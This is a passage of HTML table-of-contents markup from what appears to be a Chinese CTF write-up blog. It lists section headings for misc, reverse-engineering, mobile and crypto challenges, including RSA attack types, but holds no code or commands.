toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">4.2.1.1.2.</span> <span class="toc-text">使用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="toc-number">4.3.</span> <span class="toc-text">社会工程学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9B%BE%E5%88%86%E6%9E%90%E2%80%94%E2%80%94BugKu%E7%A4%BE%E5%B7%A5-%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86"><span class="toc-number">4.3.1.</span> <span class="toc-text">地图分析——BugKu社工-进阶收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%B8%8E%E6%8B%BC%E5%9B%BE"><span class="toc-number">4.4.</span> <span class="toc-text">二维码与拼图</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE1%E3%80%810%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81%E3%80%81%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%AE%9A%E4%BD%8D%E8%A7%92%E8%A1%A5%E5%85%85%E2%80%94%E2%80%94BugKu1%E5%92%8C0%E7%9A%84%E6%95%85%E4%BA%8B"><span class="toc-number">4.4.1.</span> <span class="toc-text">根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6"><span class="toc-number">4.5.</span> <span class="toc-text">特殊文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BugKu%E3%80%81easy-nbt"><span class="toc-number">4.5.1.</span> <span class="toc-text">BugKu、easy_nbt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#buu%E3%80%81-WUSTCTF2020-%E7%88%AC"><span class="toc-number">4.5.2.</span> <span class="toc-text">buu、[WUSTCTF2020]爬</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E9%9A%90%E8%97%8F"><span class="toc-number">4.6.</span> <span class="toc-text">文件内容隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%BE%E9%83%A8%E8%97%8F%E6%96%87%E6%9C%AC"><span class="toc-number">4.6.1.</span> <span class="toc-text">尾部藏文本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81-BugKu%E3%80%81%E8%BF%99%E6%98%AF%E4%B8%80%E5%BC%A0%E5%8D%95%E7%BA%AF%E7%9A%84%E5%9B%BE%E7%89%87"><span class="toc-number">4.6.1.1.</span> <span class="toc-text">unicode编码-BugKu、这是一张单纯的图片</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%BE%E9%83%A8%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">4.6.2.</span> <span class="toc-text">尾部藏文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#outguess%E9%9A%90%E5%86%99%E3%80%81alison-likes-jojo"><span class="toc-number">4.6.2.1.</span> <span class="toc-text">outguess隐写、alison_likes_jojo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E5%86%99"><span class="toc-number">4.7.</span> <span class="toc-text">隐写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9PNG%E5%9B%BE%E7%89%87%E7%9A%84%E5%AE%BD%E9%AB%98%E9%9A%90%E5%86%99"><span class="toc-number">4.7.1.</span> <span class="toc-text">修改PNG图片的宽高隐写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BugKu%E3%80%81%E9%9A%90%E5%86%99"><span class="toc-number">4.7.1.1.</span> <span class="toc-text">BugKu、隐写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PNG%E3%81%AELSB%E6%9C%80%E4%BD%8E%E4%BD%8D"><span class="toc-number">4.7.2.</span> <span class="toc-text">PNGのLSB最低位</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SUCTF-2019-Game"><span class="toc-number">4.7.2.1.</span> <span class="toc-text">[SUCTF 2019]Game</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E9%9A%90%E5%86%99"><span class="toc-number">4.7.3.</span> <span class="toc-text">base64隐写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">4.8.</span> <span class="toc-text">流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Telnet%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">4.8.1.</span> <span class="toc-text">Telnet流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bugku%E3%80%81telnet"><span class="toc-number">4.8.1.1.</span> <span class="toc-text">Bugku、telnet</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">4.8.2.</span> <span class="toc-text">http流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#buu%E3%80%81%E7%99%BE%E9%87%8C%E6%8C%91%E4%B8%80"><span class="toc-number">4.8.2.1.</span> <span class="toc-text">buu、百里挑一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-Attack"><span class="toc-number">4.8.2.2.</span> <span class="toc-text">[安洵杯 2019]Attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SUCTF2018-followme"><span class="toc-number">4.8.2.3.</span> <span class="toc-text">[SUCTF2018]followme</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">4.8.3.</span> <span class="toc-text">USB流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E3%80%81USB"><span class="toc-number">4.8.3.1.</span> <span class="toc-text">BUUCTF、USB</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%95%B0%E6%8D%AE"><span class="toc-number">4.8.4.</span> <span class="toc-text">特殊数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9C%98%E8%9B%9B%E4%BE%A0%E5%91%80"><span class="toc-number">4.8.4.1.</span> <span class="toc-text">蜘蛛侠呀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#office%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3"><span class="toc-number">4.9.</span> <span class="toc-text">office文件相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#word%E6%96%87%E4%BB%B6%E5%86%85%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">4.9.1.</span> <span class="toc-text">word文件内藏文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bugku%E3%80%81%E7%9C%BC%E8%A7%81%E9%9D%9E%E5%AE%9E"><span class="toc-number">4.9.1.1.</span> <span class="toc-text">bugku、眼见非实</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UTCTF2020-docx"><span class="toc-number">4.9.1.2.</span> <span class="toc-text">[UTCTF2020]docx</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81"><span class="toc-number">4.10.</span> <span class="toc-text">压缩包密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#buu%E3%80%81-GUET-CTF2019-zips"><span class="toc-number">4.10.1.</span> <span class="toc-text">buu、[GUET-CTF2019]zips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#buu%E3%80%81-MRCTF2020-%E5%8D%83%E5%B1%82%E5%A5%97%E8%B7%AF"><span class="toc-number">4.10.2.</span> <span class="toc-text">buu、[MRCTF2020]千层套路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#buu%E3%80%81%E7%9C%9F%E5%AE%9E%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">4.10.3.</span> <span class="toc-text">buu、真实的压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#buu%E3%80%81-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="toc-number">4.10.4.</span> <span class="toc-text">buu、[ACTF新生赛2020]明文攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%99%E5%87%BA%E5%AD%97%E4%B8%B2"><span class="toc-number">4.11.</span> <span class="toc-text">给出字串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TTL%E9%9A%90%E5%86%99"><span class="toc-number">4.11.1.</span> <span class="toc-text">TTL隐写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SWPU2019-Network"><span class="toc-number">4.11.1.1.</span> <span class="toc-text">[SWPU2019]Network</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AB%E9%80%86%E5%90%91%E7%9A%84misc"><span class="toc-number">4.12.</span> <span class="toc-text">含逆向的misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-CyberPunk"><span class="toc-number">4.12.1.</span> <span class="toc-text">[MRCTF2020]CyberPunk</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-number">5.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E5%90%91%E4%BB%8B%E7%BB%8D%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">5.1.</span> <span class="toc-text">方向介绍与解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E5%90%91%E7%9A%84%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-number">5.1.1.</span> <span class="toc-text">方向的简单介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98"><span class="toc-number">5.1.2.</span> <span class="toc-text">一般的逆向题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E8%BF%B7%E5%AE%AB%E9%A2%98"><span class="toc-number">5.1.3.</span> <span class="toc-text">一般的迷宫题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E9%80%86%E5%90%91-%E5%95%A5%E9%83%BD%E6%B2%A1%E6%9C%89%EF%BC%8C%E7%AE%80%E5%8D%95%E7%9A%84%E7%AE%97%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">一般逆向(啥都没有，简单的算法)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-easyre"><span class="toc-number">5.2.1.</span> <span class="toc-text">[ACTF新生赛2020]easyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#buu%E3%80%81Youngter-drive"><span class="toc-number">5.2.2.</span> <span class="toc-text">buu、Youngter-drive</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt"><span class="toc-number">5.2.3.</span> <span class="toc-text">[ACTF新生赛2020]usualCrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-Transform"><span class="toc-number">5.2.4.</span> <span class="toc-text">[MRCTF2020]Transform</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E4%B8%8B%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91-elf%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91"><span class="toc-number">5.3.</span> <span class="toc-text">Linux下文件逆向(elf文件逆向)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-luck-guy"><span class="toc-number">5.3.1.</span> <span class="toc-text">[GXYCTF2019]luck_guy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-JustRE"><span class="toc-number">5.3.2.</span> <span class="toc-text">[BJDCTF2020]JustRE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE"><span class="toc-number">5.3.3.</span> <span class="toc-text">[2019红帽杯]easyRE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-rome"><span class="toc-number">5.3.4.</span> <span class="toc-text">[ACTF新生赛2020]rome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GUET-CTF2019-re"><span class="toc-number">5.3.5.</span> <span class="toc-text">[GUET-CTF2019]re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF2019-SignIn"><span class="toc-number">5.3.6.</span> <span class="toc-text">[SUCTF2019]SignIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-level1"><span class="toc-number">5.3.7.</span> <span class="toc-text">[WUSTCTF2020]level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-level2"><span class="toc-number">5.3.8.</span> <span class="toc-text">[WUSTCTF2020]level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GWCTF-2019-xxor"><span class="toc-number">5.3.9.</span> <span class="toc-text">[GWCTF 2019]xxor</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%A0%B4%E8%A7%A3-CTF%E5%90%91"><span class="toc-number">5.4.</span> <span class="toc-text">注册程序的破解(CTF向)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">5.4.1.</span> <span class="toc-text"> </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91"><span class="toc-number">5.5.</span> <span class="toc-text">其他文件逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pyc%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91"><span class="toc-number">5.5.1.</span> <span class="toc-text">pyc文件逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GWCTF-2019-pyre"><span class="toc-number">5.5.1.1.</span> <span class="toc-text">[GWCTF 2019]pyre</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E6%96%87%E4%BB%B6%E9%80%86%E5%90%91"><span class="toc-number">5.5.2.</span> <span class="toc-text">js文件逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FlareOn4-login"><span class="toc-number">5.5.2.1.</span> <span class="toc-text">[FlareOn4]login</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MOBILE"><span class="toc-number">6.</span> <span class="toc-text">MOBILE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E5%90%91%E4%BB%8B%E7%BB%8D"><span class="toc-number">6.1.</span> <span class="toc-text">方向介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%88%ACAndroid%E9%80%86%E5%90%91"><span class="toc-number">6.2.</span> <span class="toc-text">一般Android逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#buu%E3%80%81findit"><span class="toc-number">6.2.1.</span> <span class="toc-text">buu、findit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%A0%B4%E8%A7%A3-CTF%E5%90%91-1"><span class="toc-number">6.3.</span> <span class="toc-text">注册程序的破解(CTF向)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#buu%E3%80%81%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8"><span class="toc-number">6.3.1.</span> <span class="toc-text">buu、简单注册器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Android%E7%97%85%E6%AF%92%E9%80%86%E5%90%91"><span class="toc-number">6.4.</span> <span class="toc-text">Android病毒逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%86%8C"><span class="toc-number">6.4.1.</span> <span class="toc-text">相册</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-number">7.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81"><span class="toc-number">7.1.</span> <span class="toc-text">古典密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81"><span class="toc-number">7.1.1.</span> <span class="toc-text">培根密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GUET-CTF2019-NO-SOS"><span class="toc-number">7.1.1.1.</span> <span class="toc-text">[GUET-CTF2019]NO SOS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%8C%E5%B0%94%E5%AF%86%E7%A0%81"><span class="toc-number">7.1.2.</span> <span class="toc-text">希尔密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UTCTF2020-hill"><span class="toc-number">7.1.2.1.</span> <span class="toc-text">[UTCTF2020]hill</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A0%81"><span class="toc-number">7.1.3.</span> <span class="toc-text">四方密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E9%9D%A2%E5%85%AB%E6%96%B9"><span class="toc-number">7.1.3.1.</span> <span class="toc-text">四面八方</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">7.1.4.</span> <span class="toc-text">特殊字符</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81crypto3"><span class="toc-number">7.1.4.1.</span> <span class="toc-text">ctfshow、crypto3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A2%E5%88%A9%E6%AF%94%E5%A5%A5%E6%96%AF%E6%96%B9%E9%98%B5%E5%AF%86%E7%A0%81"><span class="toc-number">7.1.5.</span> <span class="toc-text">波利比奥斯方阵密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BJDCTF2020-Polybius"><span class="toc-number">7.1.5.1.</span> <span class="toc-text">[BJDCTF2020]Polybius</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E4%B8%8E%E8%B0%83%E5%88%B6"><span class="toc-number">7.1.6.</span> <span class="toc-text">编码与调制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BJDCTF2020-%E7%BC%96%E7%A0%81%E4%B8%8E%E8%B0%83%E5%88%B6"><span class="toc-number">7.1.6.1.</span> <span class="toc-text">[BJDCTF2020]编码与调制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E6%9D%82%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81"><span class="toc-number">7.1.7.</span> <span class="toc-text">复杂古典密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UTCTF2020-basic-crypto"><span class="toc-number">7.1.7.1.</span> <span class="toc-text">[UTCTF2020]basic-crypto</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-crypto-classic1"><span class="toc-number">7.1.7.2.</span> <span class="toc-text">[ACTF新生赛2020]crypto-classic1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NPUCTF2020-Classical-Cipher"><span class="toc-number">7.1.7.3.</span> <span class="toc-text">[NPUCTF2020]Classical Cipher</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E5%BC%82%E6%88%96%E5%8A%A0%E5%AF%86"><span class="toc-number">7.1.8.</span> <span class="toc-text">普通异或加密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EasyProgram"><span class="toc-number">7.1.8.1.</span> <span class="toc-text">EasyProgram</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1%E4%B8%80%E5%AF%86"><span class="toc-number">7.1.9.</span> <span class="toc-text">一次一密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AFCTF2018-%E4%BD%A0%E5%90%AC%E8%BF%87%E4%B8%80%E6%AC%A1%E4%B8%80%E5%AF%86%E4%B9%88"><span class="toc-number">7.1.9.1.</span> <span class="toc-text">[AFCTF2018]你听过一次一密么?</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%B7%B7%E5%90%88"><span class="toc-number">7.2.</span> <span class="toc-text">密码混合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AFCTF2018-%E8%8A%B1%E5%BC%80%E8%97%8F%E5%AE%9D%E5%9C%B0"><span class="toc-number">7.2.1.</span> <span class="toc-text">[AFCTF2018]花开藏宝地</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Secret1"><span class="toc-number">7.2.1.1.</span> <span class="toc-text">Secret1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Secret2"><span class="toc-number">7.2.1.2.</span> <span class="toc-text">Secret2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Secret4"><span class="toc-number">7.2.1.3.</span> <span class="toc-text">Secret4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bloom%E9%97%A8%E9%99%90%E6%96%B9%E6%A1%88"><span class="toc-number">7.2.1.4.</span> <span class="toc-text">Bloom门限方案</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BJDCTF2020-%E4%BC%8F%E7%BE%B2%E5%85%AD%E5%8D%81%E5%9B%9B%E5%8D%A6"><span class="toc-number">7.2.1.5.</span> <span class="toc-text">[BJDCTF2020]伏羲六十四卦</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rsa"><span class="toc-number">7.3.</span> <span class="toc-text">rsa</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E7%9A%84%E6%B1%82%E5%8F%96"><span class="toc-number">7.3.1.</span> <span class="toc-text">各种参数的求取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89e-d%E5%92%8Cn%E5%A6%82%E4%BD%95%E6%B1%82%E5%87%BAphi"><span class="toc-number">7.3.1.1.</span> <span class="toc-text">有e*d和n如何求出phi</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89phi%E5%92%8Cn%E5%A6%82%E4%BD%95%E5%88%86%E8%A7%A3n"><span class="toc-number">7.3.1.2.</span> <span class="toc-text">有phi和n如何分解n</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86%E6%B1%82%E9%80%9A%E8%A7%A3"><span class="toc-number">7.3.1.3.</span> <span class="toc-text">中国剩余定理求通解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8Fe%E5%80%BC%E6%97%B6%E7%9A%84%E7%A2%B0%E6%92%9E%E8%84%9A%E6%9C%AC"><span class="toc-number">7.3.1.4.</span> <span class="toc-text">小e值时的碰撞脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8rsa%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">7.3.2.</span> <span class="toc-text">使用rsa的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WUSTCTF2020-%E6%83%85%E4%B9%A6"><span class="toc-number">7.3.2.1.</span> <span class="toc-text">[WUSTCTF2020]情书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#INSHack2017-rsa16m"><span class="toc-number">7.3.2.2.</span> <span class="toc-text">[INSHack2017]rsa16m</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#INSHack2019-Yet-Another-RSA-Challenge-Part-1"><span class="toc-number">7.3.2.3.</span> <span class="toc-text">[INSHack2019]Yet Another RSA Challenge - Part 1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%ACrsa"><span class="toc-number">7.3.3.</span> <span class="toc-text">一般rsa</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#buu%E3%80%81rsa"><span class="toc-number">7.3.3.1.</span> <span class="toc-text">buu、rsa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81crypto4"><span class="toc-number">7.3.3.2.</span> <span class="toc-text">ctfshow、crypto4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81crypto4-1"><span class="toc-number">7.3.3.3.</span> <span class="toc-text">ctfshow、crypto4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81babyrsa"><span class="toc-number">7.3.3.4.</span> <span class="toc-text">ctfshow、babyrsa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81babyrsa-1"><span class="toc-number">7.3.3.5.</span> <span class="toc-text">ctfshow、babyrsa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81easyrsa2"><span class="toc-number">7.3.3.6.</span> <span class="toc-text">ctfshow、easyrsa2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81easyrsa6"><span class="toc-number">7.3.3.7.</span> <span class="toc-text">ctfshow、easyrsa6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dp%E6%B3%84%E9%9C%B2"><span class="toc-number">7.3.4.</span> <span class="toc-text">dp泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WUSTCTF2020-dp-leaking-1s-very-d-angerous"><span class="toc-number">7.3.4.1.</span> <span class="toc-text">[WUSTCTF2020]dp_leaking_1s_very_d@angerous</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.5.</span> <span class="toc-text">共模攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81easyrsa3"><span class="toc-number">7.3.5.1.</span> <span class="toc-text">ctfshow、easyrsa3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.6.</span> <span class="toc-text">低加密指数攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81easyrsa4"><span class="toc-number">7.3.6.1.</span> <span class="toc-text">ctfshow、easyrsa4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#e%E5%BE%88%E5%A4%A7%E6%97%B6-Winner%E2%80%99s-attack"><span class="toc-number">7.3.7.</span> <span class="toc-text">e很大时(Winner’s attack)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81easyrsa5"><span class="toc-number">7.3.7.1.</span> <span class="toc-text">ctfshow、easyrsa5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5p%E9%AB%98%E4%BD%8D%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.8.</span> <span class="toc-text">已知p高位攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ctfshow%E3%80%81easyrsa7"><span 